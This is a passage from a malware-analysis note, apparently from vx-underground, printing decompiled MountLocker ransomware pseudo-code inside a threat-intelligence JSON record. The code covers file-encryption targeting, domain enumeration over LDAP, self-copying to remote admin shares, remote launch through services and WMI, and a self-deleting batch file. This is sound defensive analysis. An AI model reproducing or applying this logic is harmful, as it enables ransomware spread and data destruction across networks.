{\n  target_info->encrypt_target_of_full_flag = 1;\n }\n return 0;\n}\n\n + If target is file, check is valid to be encrypted:\n\n```\n\n-----\n\n```\nunsigned int __fastcall f_ml_check_file_is_in_execption_list(__int64 stru_offset,\nml_target_info *target_info)\n{\n DWORD file_size; // eax\n WCHAR *file_name; // rbx\n _InterlockedIncrement(&dword_140013320);\n if ( target_info->encrypt_target_of_full_flag && CONTAINING_RECORD(stru_offset,\nml_target_detail, num_targets)->field_1C == 1 )\n {\n  _InterlockedIncrement(&dword_140013334);\n  return 0;\n }\n file_size = CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.nFileSizeLow;\n // If file size is less than MIN_CRYPT_SIZE | if file size is larger than\nMAX_CRYPT_SIZE\n // then exit sub\n if ( (!file_size || file_size < g_min_size_to_enc_flag) &&\n!CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.nFileSizeHigh\n  || g_max_size_to_enc_flag\n  && (CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.nFileSizeHigh || g_max_size_to_enc_flag < file_size) )\n {\n  _InterlockedIncrement(&dword_140013338);\n  return 0;\n }\n // not encrypt ransom note file\n file_name = CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.cFileName;\n if ( !lstrcmpiW(CONTAINING_RECORD(stru_offset, ml_target_detail, num_targets)>lpFindData.cFileName, L\"RecoveryManual.html\") )\n {\n  _InterlockedIncrement(&dword_140013330);\n  return 0;\n }\n // not include Boot Manager\n if ( !lstrcmpiW(file_name, L\"bootmgr\") )\n {\n  goto exit_sub;\n }\n // file name has the encrypted file extension\n if ( StrStrIW(file_name, g_enc_file_ext_ReadManual_F638D8A0) )\n {\n  _InterlockedIncrement(&dword_14001332C);\n  return 0;\n }\n // file extension is in the ignored list\n if ( !f_ml_check_extension_in_ignored_list(file_name) )\n {\n  return 1;\n }\nexit_sub:\n _InterlockedIncrement(&dword_140013328);\n\n```\n\n-----\n\n```\n return 0;\n}\n\n## + File extension is not in ignored list:\n'exe'\n'dll'\n'sys'\n'msi'\n'mui'\n'inf'\n'cat'\n'bat'\n'cmd'\n'ps1'\n'vbs'\n'ttf'\n'fon'\n'lnk'\n\n```\n\n-----\n\n```\nunsigned int __fastcall f_ml_check_extension_in_ignored_list(WCHAR file_name)\n{\n WCHAR curr_char; // r8\n WCHAR *v2; // rdx\n WCHAR *psz_extension; // rax\n _WORD *ext_name_pos; // rdx\n __int64 i; // rcx\n signed __int64 offset; // r8\n const WCHAR *pwsz_ignored_ext_list; // rax\n __int64 ignored_ext_idx; // rbx\n WCHAR psz1[36]; // [rsp+20h] [rbp-48h]\n curr_char = *file_name;\n v2 = 0i64;\n if ( !*file_name )\n {\n  return 0;\n }\n do\n {\n  psz_extension = file_name;\n  if ( curr_char != '.' )\n  {\n   psz_extension = v2;\n  }\n  ++file_name;\n  v2 = psz_extension;\n  curr_char = *file_name;\n }\n while ( *file_name );\n if ( !psz_extension )\n {\n  return 0;\n }\n ext_name_pos = psz_extension + 1;\n i = 0i64;\n if ( psz_extension[1] )\n {\n  offset = (char *)psz1 - (char *)ext_name_pos;\n  // copy extension name to new buffer\n  while ( i != 30 )\n  {\n   ++i;\n   *(_WORD *)((char *)ext_name_pos + offset) = *ext_name_pos;\n   ++ext_name_pos;\n   if ( !*ext_name_pos )\n   {\n    goto chec_in_avoid_list;\n   }\n  }\n }\n else\n {\nchec_in_avoid_list:\n  psz1[i] = 0;\n\n```\n\n-----\n\n```\n  if ( i )\n  {\n   pwsz_ignored_ext_list = g_ignored_extension_list;\n   ignored_ext_idx = 0i64;\n   while ( pwsz_ignored_ext_list )\n   {\n    if ( !StrCmpIW(psz1, pwsz_ignored_ext_list) )\n    {\n     return 1;\n    }\n    pwsz_ignored_ext_list = (&g_ignored_extension_list)[++ignored_ext_idx];\n   }\n  }\n }\n return 0;\n}\n\n## Worm feature\n\n + Use IDirectorySearch COM interface to enumerate PC into domain:\n\n```\n\n-----\n\n```\nunsigned int __fastcall f_ml_enum_pc_into_domain_via_LDAP(ml_worm_info worm_info)\n{\n const WCHAR *wsz_UserName; // rbx\n const WCHAR *wsz_Password; // rsi\n DWORD err_code; // eax\n HRESULT v6; // edx\n MACRO_NERR hres; // ebx MAPDST\n HRESULT res; // eax\n HRESULT err_code_1; // er8\n WCHAR *err_str; // r8\n WCHAR v12[24]; // [rsp+30h] [rbp-D0h]\n WCHAR lpszLDAPPathName[280]; // [rsp+60h] [rbp-A0h]\n IDirectorySearch *pDSSearch; // [rsp+2A0h] [rbp+1A0h]\n __int64 phSearchResult; // [rsp+2A8h] [rbp+1A8h]\n LPBYTE lpDcName; // [rsp+2B0h] [rbp+1B0h]\n const wchar_t *wsz_name; // [rsp+2B8h] [rbp+1B8h]\n wsz_name = L\"name\";\n f_ml_write_format_string_to_log_file_or_console(3, L\"Enum PC into domain...\\r\\n\");\n wsz_UserName = g_szUserName;\n wsz_Password = g_szPassword;\n lpDcName = 0i64;\n // use LDAP to make Active Directory query requests to the primary domain\ncontroller\n lstrcpyW(lpszLDAPPathName, L\"LDAP://\");\n err_code = NetGetDCName(0i64, 0i64, &lpDcName);\n hres = NERR_DCNotFound;\n if ( err_code == NERR_DCNotFound )\n {\n  v6 = NERR_DCNotFound;\n }\n else\n {\n  if ( !err_code && lpDcName )\n  {\n   lstrcatW(lpszLDAPPathName, (LPCWSTR)lpDcName + 2);\n   NetApiBufferFree(lpDcName);\n  }\n  // retrieves IDirectorySearch interface\n  hres = ADsOpenObject(lpszLDAPPathName, wsz_UserName, wsz_Password, 0,\n&IID_IDirectorySearch, (void **)&pDSSearch);\n  if ( hres == NERR_Success )\n  {\n   // search for all computers in domain\n   hres = (unsigned int)pDSSearch->lpVtbl->ExecuteSearch(pDSSearch, L\"\n(objectClass=computer)\", &wsz_name, 1i64, &phSearchResult);\n   if ( hres == NERR_Success )\n   {\n    for ( res = pDSSearch->lpVtbl->GetFirstRow(pDSSearch, phSearchResult); ; res\n= pDSSearch->lpVtbl->GetNextRow(pDSSearch, phSearchResult) )\n    {\n     hres = res;\n     if ( res )\n     {\n      break;\n\n```\n\n-----\n\n```\n     }\n     hres = f_ml_extract_DN_string_and_setup_stru_func(pDSSearch,\nphSearchResult, worm_info);\n     if ( hres )\n     {\n      break;\n     }\n    }\n    pDSSearch->lpVtbl->CloseSearchHandle(pDSSearch, phSearchResult);\n   }\n   pDSSearch->lpVtbl->Release(pDSSearch);\n   hres = NERR_Success;\n  }\n  v6 = hres;\n  if ( hres == NERR_Success )\n  {\n   sub_140003290(worm_info);\n   f_ml_write_format_string_to_log_file_or_console(3, L\"Enum PC into domain...\nFINISHED\\r\\n\");\n   return 1;\n  }\n }\n err_code_1 = (unsigned __int16)hres;\n if ( (hres & 0xFFFF0000) != 0x80070000 )\n {\n  err_code_1 = v6;\n }\n switch ( err_code_1 )\n {\n  case 0x52E:\n   err_str = L\"LOGON_ERROR\";\n   break;\n  case 5:\n   err_str = L\"ACCESS_DENIED\";\n   break;\n  case 8:\n   err_str = L\"NOT_ENOUGH_MEMORY\";\n   break;\n  case 0x35:\n   err_str = L\"BAD_PATH_OR_OFFLINE\";\n   break;\n  default:\n   wsprintfW(v12, L\"%0.8X\");\n   err_str = v12;\n   break;\n }\n f_ml_write_format_string_to_log_file_or_console(3, L\"[ERROR] locker.worm > enum pc\ninto domain error=%s\\r\\n\", err_str);\n return 0;\n}\n\n## + Use WNetAddConnection2W to make a connection to remote target PC by using the provided username and password arg:\n\n```\n\n-----\n\n```\n__int64 __fastcall f_ml_launch_ransomware_remotely(WCHAR DN_PC_Name)\n{\n int ret; // edi\n DWORD connRes; // eax MAPDST\n WCHAR *err_str; // r8\n HANDLE h_proc_heap; // rax\n WCHAR v8[24]; // [rsp+20h] [rbp-B8h]\n WCHAR Name[68]; // [rsp+50h] [rbp-88h]\n ret = 0;\n if ( g_szUserName )\n {\n  // use WNetAddConnection2W\n  connRes = f_ml_establish_connection_with_remote_pc(DN_PC_Name, g_szUserName,\ng_szPassword);\n  // If the function fails, log errors\n  if ( connRes )\n  {\n   if ( (connRes & 0xFFFF0000) == 0x80070000 )\n   {\n    connRes = (unsigned __int16)connRes;\n   }\n   switch ( connRes )\n   {\n    case 0x52Eu:\n     err_str = L\"LOGON_ERROR\";\n     break;\n    case 5u:\n     err_str = L\"ACCESS_DENIED\";\n     break;\n    case 8u:\n     err_str = L\"NOT_ENOUGH_MEMORY\";\n     break;\n    case 0x35u:\n     err_str = L\"BAD_PATH_OR_OFFLINE\";\n     break;\n    default:\n     wsprintfW(v8, L\"%0.8X\");\n     err_str = v8;\n     break;\n   }\n   f_ml_write_format_string_to_log_file_or_console(1, L\"[WARN] locker.worm > logon\non server error=%s pcname=%s \\r\\n\", err_str, DN_PC_Name);\n  }\n  else\n  {\n   ret = 1;\n  }\n }\n f_ml_drop_and_launch_ransomware(DN_PC_Name);\n if ( ret )\n {\n  wsprintfW(Name, L\"\\\\\\\\%s\", DN_PC_Name);\n  WNetCancelConnection2W(Name, 0, 1);\n }\n\n```\n\n-----\n\n```\n if ( !DN_PC_Name )\n {\n  return 0i64;\n }\n h_proc_heap = GetProcessHeap();\n HeapFree(h_proc_heap, 0, DN_PC_Name);\n return 0i64;\n}\n\n## … then try to drop ransomware to remote target PC:\n\n```\n\n-----\n\n```\n remote_victim_info.copy_file_to_share_resource_flag 0;\n remote_victim_info.rand_num = GetTickCount();\n remote_victim_info.PC_Name = DN_PC_Name;\n remote_victim_info.ProgramData_path = L\"C:\\\\ProgramData\";\n remote_victim_info.win32_err_code = ERROR_NOT_FOUND;\n *(_OWORD *)&remote_victim_info.file_path = 0i64;\n wsprintfW(remoteProgramData_path, L\"\\\\\\\\%s\\\\C$\\\\ProgramData\", DN_PC_Name);\n f_ml_processing_shared_resource_and_drop_itself(remoteProgramData_path,\n&remote_victim_info);\n if ( !remote_victim_info.copy_file_to_share_resource_flag )\n {\n  remote_victim_info.ProgramData_path = 0i64;\n  res = f_ml_retrieve_shared_resource_info_and_exec_func(\n      remote_victim_info.PC_Name,\n      f_ml_processing_shared_resource_and_drop_itself,\n      &remote_victim_info);\n  v3 = res;\n  if ( res )\n  {\n   if ( (res & 0xFFFF0000) == 0x80070000 )\n   {\n    v3 = (unsigned __int16)res;\n   }\n   switch ( v3 )\n   {\n    case 0x52E:\n     errStr = L\"LOGON_ERROR\";\n     break;\n    case 5:\n     errStr = L\"ACCESS_DENIED\";\n     break;\n    case 8:\n     errStr = L\"NOT_ENOUGH_MEMORY\";\n     break;\n    case 0x35:\n     errStr = L\"BAD_PATH_OR_OFFLINE\";\n     break;\n    default:\n     wsprintfW(v28, L\"%0.8X\");\n     errStr = v28;\n     break;\n   }\n   szEnum_share_err = L\"\\t%s... ENUM shares error=%s\\r\\n\";\nLABEL_15:\n   f_ml_write_format_string_to_log_file_or_console(3, szEnum_share_err,\nremote_victim_info.PC_Name, errStr);\n   v6 = 0;\n   goto LABEL_94;\n  }\n  if ( !remote_victim_info.copy_file_to_share_resource_flag )\n  {\n   err_code = LOWORD(remote_victim_info.win32_err_code);\n   if ( (remote_victim_info.win32_err_code & 0xFFFF0000) != 0x80070000 )\n   {\n    err_code = remote_victim_info.win32_err_code;\n\n```\n\n-----\n\n```\n   }\n   switch ( err_code )\n   {\n    case 0x52Eu:\n     errStr = L\"LOGON_ERROR\";\n     break;\n    case 5u:\n     errStr = L\"ACCESS_DENIED\";\n     break;\n    case 8u:\n     errStr = L\"NOT_ENOUGH_MEMORY\";\n     break;\n    case 0x35u:\n     errStr = L\"BAD_PATH_OR_OFFLINE\";\n     break;\n    default:\n     wsprintfW(v28, L\"%0.8X\");\n     errStr = v28;\n     break;\n   }\n   szEnum_share_err = L\"\\t%s... COPY error=%s\\r\\n\";\n   goto LABEL_15;\n  }\n }\n\n```\n\n-----\n\n```\n__int64 __fastcall f_ml_processing_shared_resource_and_drop_itself(const WCHAR\n*remoteProgramData_path, ml_worm_remote_victim_info *victim_info)\n{\n const WCHAR *lpFileName; // rax\n wchar_t *ProgramData_path; // rdx\n const OLECHAR *cmd; // rax\n BOOL copyRes; // eax\n victim_info->copy_file_to_share_resource_flag = 0;\n // check path not have ADMIN$ or IPC$\n if ( StrStrIW(remoteProgramData_path, L\"\\\\ADMIN$\") ||\nStrStrIW(remoteProgramData_path, L\"\\\\IPC$\") )\n {\n  return 1i64;\n }\n // build random file name\n lpFileName = (const WCHAR *)f_ml_format_input_string(L\"%s\\\\%u.exe\",\nremoteProgramData_path, victim_info->rand_num);\n ProgramData_path = victim_info->ProgramData_path;\n victim_info->file_path = lpFileName;\n if ( ProgramData_path )\n {\n  cmd = (const OLECHAR *)f_ml_format_input_string(L\"\\\"%s\\\\%u.exe\\\" %s /NOLOG\",\nProgramData_path, victim_info->rand_num, g_params_arg_value);\n }\n else\n {\n  cmd = (const OLECHAR *)f_ml_format_input_string(L\"\\\"%s\\\" %s /NOLOG\", lpFileName,\ng_params_arg_value);\n }\n victim_info->szStartCmd = cmd;\n copyRes = CopyFileW(lpMountLockerPath, victim_info->file_path, 0);\n victim_info->copy_file_to_share_resource_flag = copyRes;\n if ( copyRes )\n {\n  return 0i64;\n }\n victim_info->win32_err_code = GetLastError();\n return 1i64;\n}\n\n## After successful drop, try to launch the payload on the remote host based on the\n   /NETWORK argument\n\n + Execute payload through a service.\n\n Service Name: Update<rand_num >\n\n Command: cmd.exe /c start \" payload_path params /NOLOG\"\n\n```\n\n-----\n\n```\n  if ( g_network_type  NETWORK_SERVICE )\n  {\n   launch_cmd = (WCHAR *)f_ml_format_input_string(L\"cmd.exe /c start \\\"\\\" %s\",\nremote_victim_info.szStartCmd);\n   if ( !launch_cmd )\n   {\n    res_1 = 8;\nlog_error:\n    err_code = (unsigned __int16)res_1;\n    if ( (res_1 & 0xFFFF0000) != 0x80070000 )\n    {\n     err_code = res_1;\n    }\n    switch ( err_code )\n    {\n     case 0x52Eu:\n      errStr = L\"LOGON_ERROR\";\n      break;\n     case 5u:\n      errStr = L\"ACCESS_DENIED\";\n      break;\n     case 8u:\n      errStr = L\"NOT_ENOUGH_MEMORY\";\n      break;\n     case 0x35u:\n      errStr = L\"BAD_PATH_OR_OFFLINE\";\n      break;\n     default:\n      wsprintfW(v27, L\"%0.8X\");\n      errStr = v27;\n      break;\n    }\n    v11 = L\"\\t%s... SERVICE error=%u\\r\\n\";\n    goto LABEL_90;\n   }\n   res_1 = f_ml_start_service(&remote_victim_info, launch_cmd);\n   if ( res_1 )\n   {\n    goto log_error;\n   }\nLABEL_92:\n   f_ml_write_format_string_to_log_file_or_console(3, L\"\\t%s... OK\\r\\n\",\nDN_PC_Name);\n   goto LABEL_93;\n  }\n\n```\n\n-----\n\n```\n__int64 __fastcall f_ml_start_service(ml_worm_remote_victim_info service_info, WCHAR\n*launch_cmd)\n{\n DWORD rand_num; // eax\n const WCHAR *lpPassword; // rdi\n const WCHAR *lpServiceStartName; // r14\n SC_HANDLE schSCManager; // rax MAPDST\n DWORD ret; // ebx\n SC_HANDLE hService; // rax MAPDST\n DWORD win32_err_code; // eax\n HANDLE h_proc_heap; // rax\n WCHAR ServiceName[32]; // [rsp+70h] [rbp-48h]\n rand_num = GetTickCount();\n wsprintfW(ServiceName, L\"Update%u\", rand_num);\n lpPassword = g_szPassword;\n lpServiceStartName = g_szUserName;\n // Required to call the CreateService function to create a service object and add\nit to the database.\n schSCManager = OpenSCManagerW(service_info->PC_Name, 0i64,\nSC_MANAGER_CREATE_SERVICE);\n ret = 0;\n if ( schSCManager )\n {\n  hService = CreateServiceW(\n         schSCManager,\n         ServiceName,\n         ServiceName,\n         SERVICE_ALL_ACCESS,\n         SERVICE_WIN32_OWN_PROCESS,\n         SERVICE_DEMAND_START,\n         0,\n         launch_cmd,\n         0i64,\n         0i64,\n         0i64,\n         lpServiceStartName,\n         lpPassword);\n  if ( hService )\n  {\n   if ( !StartServiceW(hService, 0, 0i64) )\n   {\n    win32_err_code = GetLastError();\n    if ( win32_err_code == ERROR_SERVICE_REQUEST_TIMEOUT )\n    {\n     win32_err_code = 0;\n    }\n    ret = win32_err_code;\n   }\n   DeleteService(hService);\n   CloseServiceHandle(hService);\n  }\n  else\n  {\n   ret = GetLastError();\n\n```\n\n-----\n\n```\n  }\n  CloseServiceHandle(schSCManager);\n }\n else\n {\n  ret = GetLastError();\n }\n h_proc_heap = GetProcessHeap();\n HeapFree(h_proc_heap, 0, launch_cmd);\n return ret;\n}\n\n## + Execute payload through WMI by using IWbemServices COM interface:\n launchWMIRes = f_ml_launch_ransom_through_WMI(DN_PC_Name, g_szUserName,\ng_szPassword, remote_victim_info.szStartCmd);\n if ( launchWMIRes == WBEM_E_LOCAL_CREDENTIALS )\n {\n  launchWMIRes = f_ml_launch_ransom_through_WMI(DN_PC_Name, 0i64, 0i64,\nremote_victim_info.szStartCmd);\n }\n if ( !launchWMIRes )\n {\n  goto LABEL_92;\n }\n v9 = (unsigned __int16)launchWMIRes;\n if ( (launchWMIRes & 0xFFFF0000) != 0x80070000 )\n {\n  v9 = launchWMIRes;\n }\n switch ( v9 )\n {\n  case 0x52E:\n   errStr = L\"LOGON_ERROR\";\n   break;\n  case 5:\n   errStr = L\"ACCESS_DENIED\";\n   break;\n  case 8:\n   errStr = L\"NOT_ENOUGH_MEMORY\";\n   break;\n  case 0x35:\n   errStr = L\"BAD_PATH_OR_OFFLINE\";\n   break;\n  default:\n   wsprintfW(v27, L\"%0.8X\");\n   errStr = v27;\n   break;\n }\n v11 = L\"\\t%s... WMI error=%s\\r\\n\";\n\n```\n\n-----\n\n```\nHRESULT __fastcall f_ml_launch_ransom_through_WMI(WCHAR szComputerName, const WCHAR\n*szUserName, const WCHAR *szPassword, const OLECHAR *szCommand)\n{\n HRESULT result; // eax\n HRESULT hres; // ebx\n IWbemClassObject *pOutParams; // [rsp+40h] [rbp-40h] MAPDST\n IWbemClassObject *pClassInstance; // [rsp+48h] [rbp-38h]\n IWbemClassObject *pInstance; // [rsp+50h] [rbp-30h]\n IWbemClassObject *pIWbemClassObject; // [rsp+58h] [rbp-28h]\n IWbemServices *pIWbemServices; // [rsp+60h] [rbp-20h] MAPDST\n VARIANT varCommand; // [rsp+68h] [rbp-18h]\n pIWbemServices = 0i64;\n pIWbemClassObject = 0i64;\n pInstance = 0i64;\n pClassInstance = 0i64;\n pOutParams = 0i64;\n result = f_ml_obtain_pointer_to_IWbemServices(szComputerName, szUserName,\nszPassword, &pIWbemServices);\n if ( result )\n {\n  return result;\n }\n // Set up to call the Win32_Process::Create method\n hres = pIWbemServices->lpVtbl->GetObjectA(pIWbemServices, L\"Win32_Process\", 0i64,\n0i64, (__int64 *)&pIWbemClassObject, 0i64);\n if ( !hres )\n {\n  if ( !pIWbemClassObject )\n  {\n   goto set_err;\n  }\n  hres = pIWbemClassObject->lpVtbl->GetMethod(pIWbemClassObject, L\"Create\", 0i64,\n(__int64 *)&pInstance, 0i64);\n  if ( hres )\n  {\n   goto release_obj;\n  }\n  if ( !pInstance )\n  {\nset_err:\n   hres = E_POINTER;\n   goto release_obj;\n  }\n  hres = pInstance->lpVtbl->SpawnInstance(pInstance, 0i64, (__int64\n*)&pClassInstance);\n  if ( !hres )\n  {\n   if ( pClassInstance )\n   {\n    // Create the values for the in-parameters and\n    // Store the value for the in-parameters\n    varCommand.vt = hres + 8;\n    varCommand.llVal = (LONGLONG)SysAllocString(szCommand);\n    hres = pClassInstance->lpVtbl->Put(pClassInstance, L\"CommandLine\", 0i64,\n\n```\n\n-----\n\n```\n(__int16 )&varCommand, 0);\n    SysFreeString(varCommand.bstrVal);\n    if ( hres )\n    {\n     goto release_obj;\n    }\n    // Execute Method\n    hres = pIWbemServices->lpVtbl->ExecMethod(\n         pIWbemServices,\n         L\"Win32_Process\",\n         L\"Create\",\n         0i64,\n         0i64,\n         pClassInstance,\n         (__int64 *)&pOutParams,\n         0i64);\n    if ( hres )\n    {\n     goto release_obj;\n    }\n    if ( pOutParams )\n    {\n     varCommand.vt = 1;\n     hres = pOutParams->lpVtbl->Get(pOutParams, L\"ProcessId\", 0i64, (VARIANT\n**)&varCommand, 0i64, 0i64);\n     if ( !hres && varCommand.vt == 1 )\n     {\n      hres = 1;\n     }\n     goto release_obj;\n    }\n   }\n   goto set_err;\n  }\n }\nrelease_obj:\n if ( pOutParams )\n {\n  pOutParams->lpVtbl->Release(pOutParams);\n }\n if ( pClassInstance )\n {\n  pClassInstance->lpVtbl->Release(pClassInstance);\n }\n if ( pInstance )\n {\n  pInstance->lpVtbl->Release(pInstance);\n }\n if ( pIWbemClassObject )\n {\n  pIWbemClassObject->lpVtbl->Release(pIWbemClassObject);\n }\n pIWbemServices->lpVtbl->Release(pIWbemServices);\n return hres;\n}\n\n```\n\n-----\n\n## Update log stats, deletes itself\n\n After completing the encryption process on the victim machine, it updates log statistics:\n```\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"==[ STATS\n]=======================\\r\\n\");\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Total crypted:\\t%.3f\nGB\\t\\t\\r\\n\", (float)((float)(int)qword_140013360 * 9.3132257e-10));\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Crypt Avg:\\t%0.3f\nMB/s\\t\\t\\r\\n\", crypt_avg);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Files:\\t\\t%0.3f\nfiles/s\\t\\t\\r\\n\", num_files);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Time:\\t\\t%u sec\\t\\t\\r\\n\",\ntime);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"==[ DIRS\n]========================\\r\\n\");\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Total:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013350);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Skipped:\\t%u\\t\\t\\r\\n\",\ndword_140013354);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Error:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013358);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"==[ FILES\n]=======================\\r\\n\");\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Total:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013320);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Locked:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013324);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"==[ FILES SKIPPED\n]===============\\r\\n\");\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Black:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013328);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Locked:\\t\\t%u\\t\\t\\r\\n\",\ndword_14001332C);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Manual:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013330);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Prog:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013334);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Size:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013338);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"==[ FILE ERROR\n]==================\\r\\n\");\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Open:\\t\\t%u\\t\\t\\r\\n\",\ndword_14001333C);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Read:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013344);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Write:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013348);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Pos:\\t\\t%u\\t\\t\\r\\n\",\ndword_14001334C);\n  f_ml_write_format_string_to_log_file_or_console(a1, L\"Rename:\\t\\t%u\\t\\t\\r\\n\",\ndword_140013340);\n\n Malware checks the /NODEL argument. If this value is 0, it will delete itself.\n\n```\n\n-----\n\n```\n  if ( !g_nodel_flag )\n  {\n   f_ml_exec_self_deletion();\n  }\n__int64 f_ml_exec_self_deletion()\n{\n __int64 tmp_path_len; // rbx\n DWORD rand_num; // eax\n struct _STARTUPINFOW StartupInfo; // [rsp+50h] [rbp-B0h]\n struct _PROCESS_INFORMATION ProcessInformation; // [rsp+C0h] [rbp-40h]\n WCHAR wsz_temp_path[264]; // [rsp+E0h] [rbp-20h]\n WCHAR CommandLine[264]; // [rsp+2F0h] [rbp+1F0h]\n tmp_path_len = GetTempPathW(MAX_PATH, wsz_temp_path);\n rand_num = GetTickCount();\n wsprintfW(&wsz_temp_path[tmp_path_len], L\"\\\\%0.8X.bat\", rand_num);\n if ( !f_ml_create_file(wsz_temp_path, \"attrib -s -r -h %1\\r\\n:l\\r\\ndel /F /Q\n%1\\r\\nif exist %1 goto l\\r\\ndel %0 \", 0x41u) )\n {\n  return 0i64;\n }\n memset(&StartupInfo, 0, sizeof(StartupInfo));\n StartupInfo.cb = 0x68;\n StartupInfo.dwFlags = 1;\n StartupInfo.wShowWindow = 0;\n wsprintfW(CommandLine, L\"\\\"%s\\\" \\\"%s\\\"\", wsz_temp_path, lpMountLockerPath);\n if ( CreateProcessW(0i64, CommandLine, 0i64, 0i64, 0, CREATE_NO_WINDOW, 0i64, 0i64,\n&StartupInfo, &ProcessInformation) )\n {\n  ExitProcess(0);\n }\n return 0i64;\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-04 - [QuickNote] MountLocker – Some pseudo-code snippets.pdf"
    ],
    "report_names": [
        "2021-08-04 - [QuickNote] MountLocker – Some pseudo-code snippets.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535641,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1653751421,
    "ts_modification_date": 1653751421,
    "files": {
        "pdf": "https://archive.orkl.eu/65389de5f68f01a9f4f4b620665d162234e345d1.pdf",
        "text": "https://archive.orkl.eu/65389de5f68f01a9f4f4b620665d162234e345d1.txt",
        "img": "https://archive.orkl.eu/65389de5f68f01a9f4f4b620665d162234e345d1.jpg"
    }
}